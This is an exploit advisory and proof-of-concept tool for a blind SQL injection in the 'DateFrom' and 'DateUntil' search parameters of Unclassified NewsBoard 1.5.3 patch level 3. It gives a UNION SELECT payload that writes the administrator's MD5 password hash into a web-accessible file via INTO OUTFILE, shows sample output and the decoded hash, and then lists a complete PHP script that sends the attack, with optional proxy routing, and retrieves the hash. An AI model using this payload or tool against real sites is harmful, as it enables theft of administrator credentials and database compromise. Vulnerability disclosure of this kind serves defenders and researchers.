<pre>
<code><span style="font: 10pt Courier New;"><span class="general1-identifier">Unclassified NewsBoard 1.5.3 patch level 3 &quot;DateFrom&quot; &amp; &quot;DateUntil&quot; blind SQL injection

software:
site: http://newsboard.unclassified.de/
description: &quot;The Unclassified NewsBoard is an open-source, PHP-based internet bulletin board system[..]&quot;




if magic_quotes_gpc both on &amp; off -&gt; SQL Injection

vulnerable code near lines 393-454 in search.inc.php:
&quot;DateFrom&quot; and &quot;DateUntil&quot; arguments are not properly sanitized before to be passed to a query

poc:
http://[target]/[path]/forum.php?req=search&amp;Query=suntzu&amp;ResultView=2&amp;Sort=2&amp;DateFrom=[SQL]&amp;DateUntil=[SQL]&amp;Forum=0


query becomes:

SELECT unb1_Posts.ID, unb1_Threads.ID, unb1_Threads.Forum FROM unb1_Posts LEFT JOIN unb1_Threads ON unb1_Posts.Thread
= unb1_Threads.ID WHERE (unb1_Posts.Date &gt;= [SQL]) AND (unb1_Posts.Date &lt; [SQL])

selected statements are integers and we don't see anything at screen, so we have to perform an hard trick,
as &quot;Datefrom&quot; we submit:

9999999999) UNION SELECT ORD(SUBSTRING(Password,1,1)),ORD(SUBSTRING(Password,2,1)),ORD(SUBSTRING(Password,3,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,4,1)),ORD(SUBSTRING(Password,5,1)),ORD(SUBSTRING(Password,6,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,7,1)),ORD(SUBSTRING(Password,8,1)),ORD(SUBSTRING(Password,9,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,10,1)),ORD(SUBSTRING(Password,11,1)),ORD(SUBSTRING(Password,12,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,13,1)),ORD(SUBSTRING(Password,14,1)),ORD(SUBSTRING(Password,15,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,16,1)),ORD(SUBSTRING(Password,17,1)),ORD(SUBSTRING(Password,18,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,19,1)),ORD(SUBSTRING(Password,20,1)),ORD(SUBSTRING(Password,21,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,22,1)),ORD(SUBSTRING(Password,23,1)),ORD(SUBSTRING(Password,24,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,25,1)),ORD(SUBSTRING(Password,26,1)),ORD(SUBSTRING(Password,27,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,28,1)),ORD(SUBSTRING(Password,29,1)),ORD(SUBSTRING(Password,30,1)) FROM unb1_users WHERE ID=1
UNION SELECT ORD(SUBSTRING(Password,31,1)),ORD(SUBSTRING(Password,32,1)),NULL INTO OUTFILE '[fullpath_to_www]suntzu' FROM unb1_users WHERE ID=1/*

now in suntzu file we have something like this:

50	49	50
51	50	102
50	57	55
97	53	55
97	53	97
55	52	51
56	57	52
97	48	101
52	97	56
48	49	102
99	51	\N

it is the Admin MD5 password hash encoded as an array of integers, if we decode it we have:

21232f297a57a5a743894a0e4a801fc3


this is the proof of concept exploit tool:

&lt;?php
#   ---UNB153pl3_xpl.php                                      11.35 12/11/2005 #
#                                                                              #
#          Unclassified NewsBoard 1.5.3 patch level 3 &quot;Datefrom&quot; blind SQL     #
#                   injection /  Admin MD5 password hash dump                  #
#                              by rgod                                         #
#                  site: http://rgod.altervista.org                            #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  make these changes in php.ini if you have troubles                          #
#  with this script:                                                           #
#  allow_call_time_pass_reference = on                                         #
#  register_globals = on                                                       #
#                                                                              #
#  Sun-tzu:&quot;If he is taking his ease, give him no rest. If his forces are      #
#  united, separate them.&quot;                                                     #

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;, 2);
ob_implicit_flush (1);

echo'&lt;html&gt;&lt;head&gt;&lt;title&gt; Unclassified  NewsBoard  1.5.3pl3  blind  SQL injection
&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
&lt;style type=&quot;text/css&quot;&gt; body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;Stile6&quot;&gt;
Unclassified  NewsBoard  1.5.3pl3  blind  SQL  injection &lt;/p&gt;&lt;p class=&quot;Stile6&quot;&gt;a
script  by  rgod  at        &lt;a href=&quot;http://rgod.altervista.org&quot;target=&quot;_blank&quot;&gt;
http://rgod.altervista.org&lt;/a&gt;&lt;/p&gt;&lt;table width=&quot;84%&quot;&gt;&lt;tr&gt;&lt;td width=&quot;43%&quot;&gt;  &lt;form
name=&quot;form1&quot;      method=&quot;post&quot;   action=&quot;'.$SERVER[PHP_SELF].'?path=value&amp;host=
value&amp;port=value&amp;proxy=value&quot;&gt; &lt;p&gt; &lt;input  type=&quot;text&quot;  name=&quot;host&quot;&gt;       &lt;span
class=&quot;Stile5&quot;&gt; * hostname (ex: www.sitename.com) &lt;/span&gt; &lt;/p&gt; &lt;p&gt;        &lt;input
type=&quot;text&quot; name=&quot;path&quot;&gt;   &lt;span class=&quot;Stile5&quot;&gt; * path ( ex: /unb/  or just / )
&lt;/span&gt;&lt;/p&gt;&lt;p&gt; &lt;input   type=&quot;text&quot; name=&quot;fullpath&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt; * full
path to site,  need  this for &quot;INTO OUTFILE&quot; statement (ex.: C:\\\www\\\site\\\)
&lt;/span&gt;&lt;/p&gt;&lt;p&gt;   &lt;input type=&quot;text&quot; name=&quot;table_prefix&quot;&gt;   &lt;span class=&quot;Stile5&quot;&gt;
specify a table  prefix other than the default (unb1_)&lt;/span&gt;      &lt;/p&gt;&lt;p&gt;&lt;input
type=&quot;text&quot;  name=&quot;port&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;specify  a  port  other  than  80
( default  value )  &lt;/span&gt;  &lt;/p&gt; &lt;p&gt;  &lt;input  type=&quot;text&quot;  name=&quot;proxy&quot;&gt;  &lt;span
class=&quot;Stile5&quot;&gt;  send  exploit  through  an  HTTP proxy (ip:port) &lt;/span&gt;&lt;/p&gt;&lt;p&gt;
&lt;input type=&quot;submit&quot;name=&quot;Submit&quot; value=&quot;go!&quot;&gt; &lt;/p&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
while ($ii &lt;= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
             for ($li=0; $li&lt;=15; $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li+$ki].&quot;&lt;/td&gt;&quot;;
			    }
            $ki=$ki+16;
            echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
            }
if (strlen($datai)==1) {echo &quot;&lt;td&gt;0&quot;.$datai.&quot;&lt;/td&gt;&quot;;} else
{echo &quot;&lt;td&gt;&quot;.$datai.&quot;&lt;/td&gt; &quot;;}
$ii++;
$ji++;
}
for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
                       }

for ($li=$ci*16; $li&lt;=strlen($headeri); $li++)
                      { echo &quot;&lt;td&gt;&quot;.$headeri[$li].&quot;&lt;/td&gt;&quot;;
			    }
echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket &lt; 0) {
                   echo &quot;socket_create() failed: reason: &quot; . socket_strerror($socket) . &quot;&lt;br&gt;&quot;;
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo &quot;OK.&lt;br&gt;&quot;;
                    echo &quot;Attempting to connect to &quot;.$host.&quot; on port &quot;.$port.&quot;...&lt;br&gt;&quot;;
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result &lt; 0) {
                                     echo &quot;socket_connect() failed.\r\nReason: (&quot;.$result.&quot;) &quot; . socket_strerror($result) . &quot;&lt;br&gt;&lt;br&gt;&quot;;
                                    }
	                       else
		                    {
                                     echo &quot;OK.&lt;br&gt;&lt;br&gt;&quot;;
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo &quot;Reading response:&lt;br&gt;&quot;;
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo &quot;Closing socket...&quot;;
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}


if (($host&lt;&gt;&quot;&quot;) and ($path&lt;&gt;&quot;&quot;) and ($fullpath&lt;&gt;&quot;&quot;))
{
$port=intval(trim($port));
if ($port=='') {$port=80;}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($table_prefix=='') {$table_prefix=&quot;unb1_&quot;;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

#STEP 1 -&gt; Dump Admin MD5 password hash...
$SQL=&quot;9999999999) UNION SELECT ORD(SUBSTRING(Password,1,1)),ORD(SUBSTRING(Password,2,1)),ORD(SUBSTRING(Password,3,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,4,1)),ORD(SUBSTRING(Password,5,1)),ORD(SUBSTRING(Password,6,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,7,1)),ORD(SUBSTRING(Password,8,1)),ORD(SUBSTRING(Password,9,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,10,1)),ORD(SUBSTRING(Password,11,1)),ORD(SUBSTRING(Password,12,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,13,1)),ORD(SUBSTRING(Password,14,1)),ORD(SUBSTRING(Password,15,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,16,1)),ORD(SUBSTRING(Password,17,1)),ORD(SUBSTRING(Password,18,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,19,1)),ORD(SUBSTRING(Password,20,1)),ORD(SUBSTRING(Password,21,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,22,1)),ORD(SUBSTRING(Password,23,1)),ORD(SUBSTRING(Password,24,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,25,1)),ORD(SUBSTRING(Password,26,1)),ORD(SUBSTRING(Password,27,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,28,1)),ORD(SUBSTRING(Password,29,1)),ORD(SUBSTRING(Password,30,1)) FROM &quot;.$table_prefix.&quot;users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,31,1)),ORD(SUBSTRING(Password,32,1)),NULL INTO OUTFILE '&quot;.$fullpath.&quot;suntzu' FROM &quot;.$table_prefix.&quot;users WHERE ID=1/*&quot;;
$SQL=urlencode($SQL);
$packet=&quot;GET &quot;.$p.&quot;forum.php?req=search&amp;Query=suntzu&amp;ResultView=2&amp;Sort=2&amp;DateFrom=&quot;.$SQL.&quot;&amp;DateUntil=&amp;Forum=0 HTTP/1.1\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.&quot;:&quot;.$port.$path.&quot;forum.php?req=search&amp;unb236sess=\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);


#STEP 2 -&gt; Retrieve dump and decode...
$packet=&quot;GET &quot;.$p.&quot;suntzu HTTP/1.1\r\n&quot;;
$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
show($packet);
sendpacketii($packet);

if (eregi(&quot;200 OK&quot;,$html))
{
$temp=explode(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html);
$dump=$temp[1];
$temp2=''; $HASH='';
for ($i=0; $i&lt;=strlen($dump)-1; $i++)
{
  if (($dump[$i]==chr(0x09)) or ($dump[$i]==chr(0x0a)))
       {$HASH.=chr($temp2); $temp2='';}
  else
     {$temp2.=$dump[$i]; if ($temp2==&quot;\N&quot;) {break;} }
}
echo &quot;&lt;br&gt;Exploit succeeded -&gt; &quot;.$HASH;
}
else
{echo &quot;Exploit failed...&quot;;}
}
else
{echo &quot;Fill * requested fields, optionally specify a proxy...&quot;;}

?&gt;


rgod
site: http://rgod.altervista.org
mail: retrogod at aliceposta it
original advisory: http://rgod.altervista.org/unb153pl3_xpl.html
</span></span>
</code></pre>
